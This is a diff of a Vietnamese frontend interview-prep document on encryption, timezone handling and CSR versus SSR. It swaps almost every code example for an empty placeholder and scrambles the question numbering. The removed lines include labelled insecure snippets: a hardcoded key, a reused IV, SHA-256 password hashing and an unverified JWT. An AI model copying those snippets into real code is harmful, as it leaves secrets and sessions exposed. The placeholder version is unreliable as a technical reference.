-✅ Store keys in: AWS KMS, Azure Key Vault, HashiCorp Vault
-❌ NEVER hardcode keys in source code
-❌ NEVER store keys in database
-
- // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
-⚡ AES-256-GCM: ~1-5ms per field
-⚡ Only encrypt sensitive fields
-⚡ Use caching for frequently accessed data
-⚡ Batch operations when possible
-
- // Chú giải: Compliance
-📋 GDPR: Right to be forgotten, data portability
-📋 HIPAA: PHI encryption requirements
-📋 PCI-DSS: Credit card data encryption
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **⚠️ Common Mistakes**
 
-```typescript
- // Chú giải: ❌ Mistake 1: Encrypt passwords
-const encrypted = encrypt(password); // Chú giải: WRONG!
- // Chú giải: ✅ Fix: Hash passwords
-const hashed = await bcrypt.hash(password, 10);
-
- // Chú giải: ❌ Mistake 2: Reuse IV
-const iv = Buffer.from('1234567890123456'); // Chú giải: WRONG!
- // Chú giải: ✅ Fix: Random IV mỗi lần
-const iv = crypto.randomBytes(12);
-
- // Chú giải: ❌ Mistake 3: No hash index for search
- // Chú giải: ✅ Fix: Maintain phone_hash, ssn_hash columns
-
- // Chú giải: ❌ Mistake 4: Encrypt everything
- // Chú giải: ✅ Fix: Only encrypt sensitive PII
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 1. ❌ Encrypting passwords (use hashing!)
@@ -25470,75 +16644,64 @@ const iv = crypto.randomBytes(12);
 
 **❌ Mistake 1: Dùng SHA-256 cho passwords**
 
-```typescript
- // Chú giải: ❌ BAD - SHA-256 too fast, vulnerable to brute-force
-const hashedPassword = crypto
-  .createHash('sha256')
-  .update(password)
-  .digest('hex');
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **✅ Correction:**
 
-```typescript
- // Chú giải: ✅ GOOD - bcrypt slow, secure
-const hashedPassword = await bcrypt.hash(password, 10);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **❌ Mistake 2: Reuse IV trong AES**
 
-```typescript
- // Chú giải: ❌ BAD - Same IV for multiple encryptions
-const iv = Buffer.from('1234567890123456');
-const cipher1 = crypto.createCipheriv('aes-256-gcm', key, iv);
-const cipher2 = crypto.createCipheriv('aes-256-gcm', key, iv); // Chú giải: ❌ Same IV!
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **✅ Correction:**
 
-```typescript
- // Chú giải: ✅ GOOD - Random IV mỗi lần
-const iv1 = crypto.randomBytes(12);
-const iv2 = crypto.randomBytes(12); // Chú giải: Different IV
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **❌ Mistake 3: Hardcode encryption keys**
 
-```typescript
- // Chú giải: ❌ BAD - Key in source code
-const key = 'my-secret-key-12345678901234567890';
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **✅ Correction:**
 
-```typescript
- // Chú giải: ✅ GOOD - Key from environment
-const key = process.env.ENCRYPTION_KEY;
-if (!key || key.length !== 32) {
-  throw new Error('Invalid ENCRYPTION_KEY');
-}
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 **❌ Mistake 4: Không verify JWT signature**
 
-```typescript
- // Chú giải: ❌ BAD - Decode without verify
-const payload = JSON.parse(
-  Buffer.from(token.split('.')[1], 'base64').toString()
-);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **✅ Correction:**
 
-```typescript
- // Chú giải: ✅ GOOD - Always verify signature
-const payload = jwt.verify(token, publicKey);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -25566,13 +16729,14 @@ const payload = jwt.verify(token, publicKey);
 - Dùng proven libraries (bcrypt, crypto, jsonwebtoken)
 - Never roll your own crypto!
 ---
-## 41. ⏰ Q41: Date & Time Handling - Xử Lý Múi Giờ Đúng Cách  
 
-**P1: Tên câu hỏi:** ⏰ Q41: Date & Time Handling - Xử Lý Múi Giờ Đúng Cách  
+## 41. Q41: ⏰ Q41: Date & Time Handling - Xử Lý Múi Giờ Đúng Cách
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: ⏰ Q41: Date & Time Handling - Xử Lý Múi Giờ Đúng Cách
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 42. Q42: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -25618,21 +16782,11 @@ const payload = jwt.verify(token, publicKey);
 **❓ Câu Hỏi:**
 Làm thế nào xử lý Date/Time trong JavaScript không bị ảnh hưởng bởi múi giờ?
 
-
 #### **⚠️ Vấn Đề Core**
 
-```typescript
-// ❌ VẤN ĐỀ: Timezone-dependent
-const date = new Date('2024-01-15'); // Chú giải: Local timezone!
- // Chú giải: User Vietnam (UTC+7): 2024-01-15 07:00:00 UTC
- // Chú giải: User US (UTC-5):      2024-01-15 05:00:00 UTC
-// → Cùng code, khác kết quả!
-
-// ❌ VẤN ĐỀ: Month zero-indexed
-new Date(2024, 1, 15); // Chú giải: February 15! (month 1 = Feb)
-
-// ❌ VẤN ĐỀ: Mutable
-date.setMonth(2); // Thay đổi date gốc!
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -25641,135 +16795,32 @@ date.setMonth(2); // Thay đổi date gốc!
 
 **Timestamp = Số milliseconds từ 1970-01-01 00:00:00 UTC (Unix Epoch)**
 
-```typescript
- // Chú giải: =====================================
-// TIMESTAMP LÀ MỘT CON SỐ TUYỆT ĐỐI
- // Chú giải: =====================================
-
-// Ví dụ: 2024-01-15 14:30:00 UTC
-const timestamp = 1705329000000; // Chú giải: milliseconds
-
-// ✅ Timestamp đại diện cho 1 ĐIỂM THỜI GIAN DUY NHẤT trên toàn cầu
-// - Không phụ thuộc múi giờ
-// - Không phụ thuộc vị trí địa lý
-// - Chỉ là 1 con số: số milli-giây từ 1970-01-01 00:00:00 UTC
-
-// GIẢI THÍCH:
- // Chú giải: ┌─────────────────────────────────────────────────────────┐
- // Chú giải: │  Timestamp 1705329000000 = "2024-01-15 14:30:00 UTC"   │
- // Chú giải: │                                                         │
-// │  Cùng 1 timestamp, DISPLAY khác múi giờ:               │
- // Chú giải: │  - Vietnam (UTC+7):  2024-01-15 21:30:00               │
- // Chú giải: │  - New York (UTC-5): 2024-01-15 09:30:00               │
- // Chú giải: │  - London (UTC+0):   2024-01-15 14:30:00               │
- // Chú giải: │                                                         │
-// │  Nhưng timestamp VẪN LÀ 1705329000000                  │
-// │  → Cùng 1 điểm thời gian, chỉ HIỂN THỊ khác!           │
- // Chú giải: └─────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **So Sánh Trực Quan:**
 
-```typescript
- // Chú giải: =====================================
-// VÍ DỤ THỰC TẾ
- // Chú giải: =====================================
-
- // Chú giải: Server gửi timestamp
-const serverTimestamp = 1705329000000; // Chú giải: 2024-01-15 14:30:00 UTC
-
-// User ở Vietnam nhận được
-const vnDate = new Date(serverTimestamp);
-console.log(vnDate.toString());
- // Chú giải: "Mon Jan 15 2024 21:30:00 GMT+0700 (Indochina Time)"
- // Chú giải: ✅ Display: 21:30:00 (UTC+7)
- // Chú giải: ✅ Timestamp: 1705329000000
-
-// User ở US nhận được
-const usDate = new Date(serverTimestamp);
-console.log(usDate.toString());
- // Chú giải: "Mon Jan 15 2024 09:30:00 GMT-0500 (Eastern Standard Time)"
- // Chú giải: ✅ Display: 09:30:00 (UTC-5)
- // Chú giải: ✅ Timestamp: 1705329000000
-
-// So sánh timestamps
-console.log(vnDate.getTime() === usDate.getTime()); // Chú giải: ✅ TRUE!
-console.log(vnDate.getTime()); // Chú giải: 1705329000000
-console.log(usDate.getTime()); // Chú giải: 1705329000000
-
- // Chú giải: =====================================
-// TẠI SAO TIMESTAMP KHÔNG BỊ ẢNH HƯỞNG?
- // Chú giải: =====================================
-
-// 1. Timestamp là CON SỐ, không phải string hay object
-const ts = 1705329000000; // Chỉ là 1 số nguyên
-
-// 2. Timestamp luôn tính từ UTC EPOCH (1970-01-01 00:00:00 UTC)
-// → Chuẩn quốc tế, không đổi
-
-// 3. Khi convert timestamp → Date, browser tự động hiển thị theo local timezone
-// Nhưng INTERNAL VALUE vẫn là timestamp (không đổi)
-const date = new Date(1705329000000);
-date.getTime(); // Chú giải: 1705329000000 (giống nhau mọi nơi)
-date.toString(); // Khác nhau theo timezone (chỉ là display)
-
- // Chú giải: =====================================
-// MINH HỌA BẰ NG SỐ
- // Chú giải: =====================================
-
-// Giả sử có 3 user ở 3 múi giờ khác nhau cùng click "Submit" 1 lúc
-
-// User Vietnam (UTC+7) - Hiển thị: 2024-01-15 21:30:00
-const vnTimestamp = new Date('2024-01-15T21:30:00+07:00').getTime();
-console.log(vnTimestamp); // Chú giải: 1705329000000
-
-// User US (UTC-5) - Hiển thị: 2024-01-15 09:30:00
-const usTimestamp = new Date('2024-01-15T09:30:00-05:00').getTime();
-console.log(usTimestamp); // Chú giải: 1705329000000
-
-// User UK (UTC+0) - Hiển thị: 2024-01-15 14:30:00
-const ukTimestamp = new Date('2024-01-15T14:30:00Z').getTime();
-console.log(ukTimestamp); // Chú giải: 1705329000000
-
-// ✅ CÙNG 1 TIMESTAMP = CÙNG 1 THỜI ĐIỂM
-// → Lưu vào database: 1705329000000
-// → Compare: So sánh 1 số duy nhất
-// → Không bị sai lệch múi giờ
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Kết Luận:**
 
-```typescript
- // Chú giải: =====================================
- // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
- // Chú giải: =====================================
-
-// ✅ Timestamp là "ngôn ngữ chung" của thời gian
-// - Mọi timezone đều convert về 1 số duy nhất
-// - Database lưu 1 giá trị, không phụ thuộc múi giờ
-// - API truyền 1 số, không bị nhầm lẫn
-// - So sánh đơn giản: a > b, a === b
-
- // Chú giải: ❌ String date BỊ ẢNH HƯỞNG timezone
-'2024-01-15' // Ambiguous! 00:00 múi giờ nào?
-'2024-01-15 14:30' // Múi giờ nào?
-
-// ✅ Timestamp KHÔNG BỊ ẢNH HƯỞNG
-1705329000000 // LUÔN LÀ 2024-01-15 14:30:00 UTC
-              // Display tùy timezone, nhưng VALUE không đổi
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **💡 Nguyên Tắc Vàng**
 
-```
-┌────────────────────────────────────────┐
-│   STORAGE:  UTC/Timestamp             │
-│   TRANSMIT: ISO 8601 + timezone       │
-│   DISPLAY:  User local timezone       │
-│   COMPUTE:  UTC/Timestamp             │
-└────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -25778,53 +16829,30 @@ console.log(ukTimestamp); // Chú giải: 1705329000000
 
 **1. Store UTC:**
 
-```typescript
- // Chú giải: ✅ Database/API: Always UTC
-await db.save({
-  createdAt: Date.now(), // Chú giải: Timestamp
- // Chú giải: Or: new Date().toISOString(), // "2024-01-15T14:30:00.000Z"
-});
-
- // Chú giải: ✅ Parse ISO 8601 (auto UTC với Z)
-const date = new Date('2024-01-15T14:30:00.000Z');
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **2. Display Local:**
 
-```typescript
- // Chú giải: ✅ Convert to user timezone
-const formatter = new Intl.DateTimeFormat('en-US', {
-  timeZone: 'Asia/Ho_Chi_Minh',
-  dateStyle: 'long',
-  timeStyle: 'short',
-});
-console.log(formatter.format(date)); // Chú giải: "January 15, 2024 at 9:30 PM"
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **3. Compare Timestamps:**
 
-```typescript
-// ✅ So sánh không bị ảnh hưởng timezone
-const isAfter = date1.getTime() > date2.getTime();
-const daysDiff = Math.floor(
-  (date2.getTime() - date1.getTime()) / (1000 * 60 * 60 * 24)
-);
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **4. Date Arithmetic:**
 
-```typescript
-// ✅ Cộng/trừ ngày
-function addDays(date: Date, days: number): Date {
-  return new Date(date.getTime() + days * 24 * 60 * 60 * 1000);
-}
-
- // Chú giải: ✅ Start/End of day (UTC)
-const startOfDay = new Date(Date.UTC(
-  date.getUTCFullYear(),
-  date.getUTCMonth(),
-  date.getUTCDate()
-));
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -25833,57 +16861,32 @@ const startOfDay = new Date(Date.UTC(
 
 **date-fns (Functional, Tree-shakeable):**
 
-```typescript
-import { format, parseISO, addDays, formatDistanceToNow } from 'date-fns';
-import { utcToZonedTime } from 'date-fns-tz';
-
-const date = parseISO('2024-01-15T14:30:00.000Z');
-format(date, 'yyyy-MM-dd HH:mm:ss'); // Chú giải: "2024-01-15 14:30:00"
-
-const vnTime = utcToZonedTime(date, 'Asia/Ho_Chi_Minh');
-formatDistanceToNow(date, { addSuffix: true }); // Chú giải: "2 hours ago"
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Luxon (OOP, Timezone-aware):**
 
-```typescript
-import { DateTime } from 'luxon';
-
-const dt = DateTime.fromISO('2024-01-15T14:30:00.000Z');
-dt.setZone('Asia/Ho_Chi_Minh').toFormat('yyyy-MM-dd HH:mm:ss');
-dt.plus({ days: 7 }).toRelative(); // Chú giải: "in 7 days"
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Day.js (Lightweight 2KB):**
 
-```typescript
-import dayjs from 'dayjs';
-import utc from 'dayjs/plugin/utc';
-import timezone from 'dayjs/plugin/timezone';
-
-dayjs.extend(utc);
-dayjs.extend(timezone);
-
-dayjs('2024-01-15T14:30:00.000Z')
-  .tz('Asia/Ho_Chi_Minh')
-  .format('YYYY-MM-DD HH:mm:ss');
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **🚀 Temporal API (Future)**
 
-```typescript
-import { Temporal } from '@js-temporal/polyfill';
-
- // Chú giải: ✅ Instant (UTC)
-const instant = Temporal.Instant.from('2024-01-15T14:30:00Z');
-
- // Chú giải: ✅ ZonedDateTime (Timezone-aware)
-const vnTime = instant.toZonedDateTimeISO('Asia/Ho_Chi_Minh');
-console.log(vnTime.toString()); // Chú giải: "2024-01-15T21:30:00+07:00[Asia/Ho_Chi_Minh]"
-
- // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến. Bất biến: giá trị không thay đổi sau khi tạo; thường dùng để tránh side-effect và dễ reasoning.
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -25892,31 +16895,16 @@ console.log(vnTime.toString()); // Chú giải: "2024-01-15T21:30:00+07:00[Asia/
 
 **✅ DO:**
 
-```typescript
- // Chú giải: Store UTC
-{ createdAt: "2024-01-15T14:30:00.000Z" }
-
- // Chú giải: Compare timestamps
-date1.getTime() > date2.getTime()
-
- // Chú giải: Use library
-import { format, parseISO } from 'date-fns';
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **❌ DON'T:**
 
-```typescript
- // Chú giải: ❌ Store without timezone
-{ date: "2024-01-15" } // Chú giải: Ambiguous!
-
- // Chú giải: ❌ Use local Date
-new Date() // Chú giải: Timezone-dependent!
-
- // Chú giải: ❌ Compare dates with ===
-date1 === date2 // Chú giải: Always false
-
- // Chú giải: ❌ Mutate
-date.setMonth(2) // Chú giải: Side effect!
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **💡 Key Takeaway:**
@@ -25962,13 +16950,14 @@ date.setMonth(2) // Chú giải: Side effect!
 - Defense in depth: Multiple layers of protection
 - Use proven libraries - NEVER roll your own crypto or date handling!
 ---
-## 42. 🖥️ Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Phân Biệt & Cách Hoạt Động Chi Tiết  
 
-**P1: Tên câu hỏi:** 🖥️ Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Phân Biệt & Cách Hoạt Động Chi Tiết  
+## 43. Q43: 🖥️ Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Phân Biệt & Cách Hoạt Động Chi Tiết
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🖥️ Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Phân Biệt & Cách Hoạt Động Chi Tiết
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 44. Q44: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -26046,41 +17035,34 @@ date.setMonth(2) // Chú giải: Side effect!
 - Giống như: Mua furniture đã lắp ráp sẵn (chỉ cần đặt vào nhà)
 - Rendering engine: Node.js server (React renderToString)
 
-
 #### **✅ Ưu Điểm CSR (Client-Side Rendering)**
 
 **1. Navigation Cực Nhanh (Fast SPA Navigation)**
-```
-User clicks link:
-- CSR: 0ms (chỉ thay đổi DOM, không reload page)
-- SSR: 500-1000ms (phải request server, đợi render)
-→ Trải nghiệm mượt mà như native app
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **2. Rich Interactions (Tương Tác Phong Phú)**
-```typescript
-// CSR: Dễ dàng làm real-time features
-- Live chat, notifications
-- Drag & drop, animations
-- Real-time data updates
-- Complex state management
-→ Full JavaScript power trên browser
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **3. Server Load Thấp (Less Server Load)**
-```
-- Server chỉ serve static files (HTML, JS, CSS)
-- Không cần render cho mỗi request
-- Dễ cache với CDN
-- Cost thấp (chỉ cần CDN, không cần powerful server)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **4. Dễ Deploy & Scale**
-```
-- Deploy lên CDN (Vercel, Netlify, CloudFront)
-- Không cần server-side logic
-- Auto-scale với CDN
-→ Chi phí thấp, dễ maintain
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26088,52 +17070,31 @@ User clicks link:
 #### **❌ Nhược Điểm CSR**
 
 **1. Initial Load Chậm (Slow First Load)**
-```
-Timeline:
-[0s] User clicks link
-[0-1s] Download HTML (5KB) - nhanh
-[1-3s] Download JS bundle (500KB-2MB) - CHẬM
-[3-4s] Parse & Execute JS - CHẬM
-[4-5s] Fetch API data - CHẬM
-[5s] User sees content - QUÁ LÂU!
 
-→ User thấy blank screen trong 3-5 giây
-→ Bounce rate cao (user rời trang)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **2. SEO Nghèo Nàn (Poor SEO)**
-```html
-<!-- Google bot sees: -->
-<html>
-  <body>
-    <div id="root"></div>  <!-- EMPTY! -->
-    <script src="bundle.js"></script>
-  </body>
-</html>
 
-→ Google không thấy nội dung
-→ Không index được
-→ SEO ranking thấp
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **3. Blank Screen Problem**
-```
-User experience:
-[0-3s] White/blank screen (nothing to see)
-[3-5s] Loading spinner (still waiting...)
-[5s+] Content appears (finally!)
 
-→ User frustrated
-→ Think website is broken
-→ Leave before content loads
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **4. Phụ Thuộc JavaScript**
-```
-- User disable JS → website không chạy
-- JS error → website crash
-- Slow device → website lag
-→ Không graceful degradation
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26141,55 +17102,31 @@ User experience:
 #### **✅ Ưu Điểm SSR (Server-Side Rendering)**
 
 **1. Initial Load Cực Nhanh (Fast Time to Content)**
-```
-Timeline:
-[0s] User clicks link
-[0.5s] Server renders HTML (nhanh vì server mạnh)
-[0.5s] Browser receives full HTML
-[0.5s] User SEES content immediately!
-[1-2s] JS hydrates in background
-[2s] Fully interactive
 
-→ User thấy nội dung trong 0.5-1 giây
-→ First impression tốt
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **2. SEO Xuất Sắc (SEO-Friendly)**
-```html
-<!-- Google bot sees: -->
-<html>
-  <body>
-    <div id="root">
-      <h1>Welcome to My Site</h1>
-      <p>Full content here...</p>
-      <article>Blog post content...</article>
-      <!-- FULL CONTENT! -->
-    </div>
-  </body>
-</html>
 
-→ Google index đầy đủ nội dung
-→ Better ranking
-→ Social media previews work (Open Graph)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **3. Better Performance (Đặc biệt cho slow devices)**
-```
-- Server render nhanh (powerful CPU)
-- User device không cần làm việc nặng
-- Suitable for low-end phones
-- Ít JS → less battery drain
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **4. Không Blank Screen**
-```
-User experience:
-[0.5s] Content appears immediately!
-[1-2s] Page becomes interactive
 
-→ Progressive enhancement
-→ Even if JS fails, HTML still works
-→ Better perceived performance
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26197,108 +17134,47 @@ User experience:
 #### **❌ Nhược Điểm SSR**
 
 **1. Server Load Cao (High Server Cost)**
-```
-CSR:
-- Server: "Here's HTML + JS" (1 lần, cache được)
-- Cost: $5/month (CDN)
 
-SSR:
-- Server: "Let me render this page..." (mỗi request)
-- Server: Parse React → Fetch data → Render HTML
-- Cost: $50-500/month (cần server mạnh)
-
-→ 10-100x chi phí hơn CSR
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **2. Navigation Chậm Hơn (Slower Navigation)**
-```
-User clicks internal link:
 
-CSR:
-- Instant (0ms) - chỉ update DOM
-- Smooth transition
-
-SSR:
-- Request server (50-200ms network)
-- Server render (50-100ms)
-- Download HTML (50-200ms)
-- Total: 500-1000ms
-→ Có thể thấy "flash" khi chuyển trang
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **3. Complexity Cao (Complex Setup)**
-```typescript
- // Chú giải: CSR: Simple
-ReactDOM.render(<App />, root);
 
- // Chú giải: SSR: Complex
-- Server setup (Express, Next.js)
-- Hydration issues (client-server mismatch)
-- Data fetching strategies
-- Cache invalidation
-- State management across server-client
-→ Nhiều bugs tiềm ẩn, khó debug
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **4. TTFB Cao Hơn (Time to First Byte)**
-```
-CSR:
-- TTFB: 50ms (serve static file)
 
-SSR:
-- TTFB: 200-500ms (render + fetch data)
-→ User đợi lâu hơn trước khi thấy gì đó
-(nhưng khi thấy thì đã có full content)
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **5. Hydration Issues**
-```typescript
- // Chú giải: Server renders: <div>Count: 0</div>
- // Chú giải: Client state:   <div>Count: 1</div>
- // Chú giải: → Mismatch! Warning!
 
- // Chú giải: Common issues:
-- Date.now() khác nhau server vs client
-- Random values
-- Browser-only APIs (window, localStorage)
-→ Requires careful coding
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
 
 #### **📊 So Sánh Trực Quan**
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                    USER EXPERIENCE COMPARISON                    │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  CSR (Client-Side Rendering):                                   │
-│  ┌──────────────────────────────────────────────────────────┐  │
-│  │ 0s ▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░  ← Blank screen          │  │
-│  │ 1s ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░  ← Downloading JS         │  │
-│  │ 2s ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░  ← Parsing JS             │  │
-│  │ 3s ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░  ← Fetching data          │  │
-│  │ 4s ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░  ← Rendering               │  │
-│  │ 5s ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ✅ Content visible!      │  │
-│  │                                                            │  │
-│  │ First Content: 5 seconds                                  │  │
-│  │ User sees: Blank → Loading → Content                     │  │
-│  └──────────────────────────────────────────────────────────┘  │
-│                                                                  │
-│  SSR (Server-Side Rendering):                                   │
-│  ┌──────────────────────────────────────────────────────────┐  │
-│  │ 0s ▓░░░░░░░░░░░░░░░░░░░░░░░░░░  ← Server rendering      │  │
-│  │ 0.5s ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ✅ Content visible!      │  │
-│  │ 1s ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ← Hydrating JS            │  │
-│  │ 2s ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ✅ Interactive!           │  │
-│  │                                                            │  │
-│  │ First Content: 0.5 seconds                                │  │
-│  │ Interactive: 2 seconds                                    │  │
-│  │ User sees: Content immediately → Becomes interactive     │  │
-│  └──────────────────────────────────────────────────────────┘  │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26306,45 +17182,24 @@ SSR:
 #### **🎯 Khi Nào Dùng Gì?**
 
 **Dùng CSR khi:**
-```
-✅ Internal tools / Admin dashboard
-   → Không cần SEO, user đã login
-   → Example: Google Analytics, Jira, Notion
 
-✅ Highly interactive apps
-   → Real-time updates, complex interactions
-   → Example: Figma, Trello, Games
-
-✅ Budget thấp
-   → Chỉ cần CDN, không cần server mạnh
-   → Startup với limited resources
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Dùng SSR khi:**
-```
-✅ Public-facing websites
-   → Cần SEO, social sharing
-   → Example: Blog, News, E-commerce
 
-✅ Landing pages / Marketing
-   → First impression matters
-   → Better conversion rate
-
-✅ Content-heavy sites
-   → Nhiều text, ít interaction
-   → Example: Documentation, Wikipedia
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 **Dùng SSG (Hybrid) khi:**
-```
-✅ Static content with occasional updates
-   → Blog posts, product pages
-   → Example: Next.js with ISR
 
-✅ Best of both worlds
-   → Fast như CSR (served from CDN)
-   → SEO-friendly như SSR
-   → Cost-effective
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26372,71 +17227,9 @@ SSR:
 
 #### **📊 Sơ Đồ So Sánh CSR vs SSR**
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                    CSR vs SSR COMPARISON                            │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  CLIENT-SIDE RENDERING (CSR)                                       │
-│  ┌──────────────────────────────────────────────────────────────┐ │
-│  │ 1. Browser Request → Server                                   │ │
-│  │    GET https: // Chú giải: example.com                                    │ │
-│  │                                                                │ │
-│  │ 2. Server Response (Minimal HTML)                             │ │
-│  │    <!DOCTYPE html>                                            │ │
-│  │    <html><head>...</head>                                     │ │
-│  │    <body>                                                     │ │
-│  │      <div id="root"></div>  ← Empty!                         │ │
-│  │      <script src="/bundle.js"></script>                      │ │
-│  │    </body></html>                                            │ │
-│  │                                                                │ │
-│  │ 3. Browser Downloads JS Bundle (Large!)                       │ │
-│  │    bundle.js (500KB - 2MB)                                    │ │
-│  │    ⏱️  Parsing + Execution time                               │ │
-│  │                                                                │ │
-│  │ 4. JavaScript Runs & Renders UI                               │ │
-│  │    React.render(<App />, root)                               │ │
-│  │    → API calls                                                │ │
-│  │    → Fetch data                                               │ │
-│  │    → Render components                                        │ │
-│  │                                                                │ │
-│  │ 5. User Sees Content                                          │ │
-│  │    ⏱️  Total: 3-5 seconds                                     │ │
-│  └──────────────────────────────────────────────────────────────┘ │
-│                                                                     │
-│  SERVER-SIDE RENDERING (SSR)                                       │
-│  ┌──────────────────────────────────────────────────────────────┐ │
-│  │ 1. Browser Request → Server                                   │ │
-│  │    GET https: // Chú giải: example.com                                    │ │
-│  │                                                                │ │
-│  │ 2. Server Renders Full HTML                                   │ │
-│  │    - Execute React on server                                  │ │
-│  │    - Fetch data from database                                 │ │
-│  │    - Generate complete HTML                                   │ │
-│  │    ⏱️  Server processing time                                 │ │
-│  │                                                                │ │
-│  │ 3. Server Response (Full HTML)                                │ │
-│  │    <!DOCTYPE html>                                            │ │
-│  │    <html><head>...</head>                                     │ │
-│  │    <body>                                                     │ │
-│  │      <div id="root">                                          │ │
-│  │        <h1>Welcome!</h1>                                      │ │
-│  │        <p>Fully rendered content...</p>  ← Complete!         │ │
-│  │      </div>                                                   │ │
-│  │      <script src="/bundle.js"></script>                      │ │
-│  │    </body></html>                                            │ │
-│  │                                                                │ │
-│  │ 4. Browser Shows Content Immediately                          │ │
-│  │    ⏱️  User sees content: 0.5-1 second                        │ │
-│  │                                                                │ │
-│  │ 5. JavaScript Hydrates (Makes Interactive)                    │ │
-│  │    React.hydrate(<App />, root)                              │ │
-│  │    → Attach event listeners                                   │ │
-│  │    → Make interactive                                         │ │
-│  │    ⏱️  Total interactive: 2-3 seconds                         │ │
-│  └──────────────────────────────────────────────────────────────┘ │
-│                                                                     │
-└─────────────────────────────────────────────────────────────────────┘
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
 ---
@@ -26445,113 +17238,16 @@ SSR:
 
 **Timeline:**
 
-```
-User clicks link
-      ↓
-[1] Browser → Server: GET /page
-      ↓
-[2] Server → Browser: Minimal HTML + <script src="bundle.js">
-      ↓                 (5-50 KB)
-      ↓
-[3] Browser downloads bundle.js
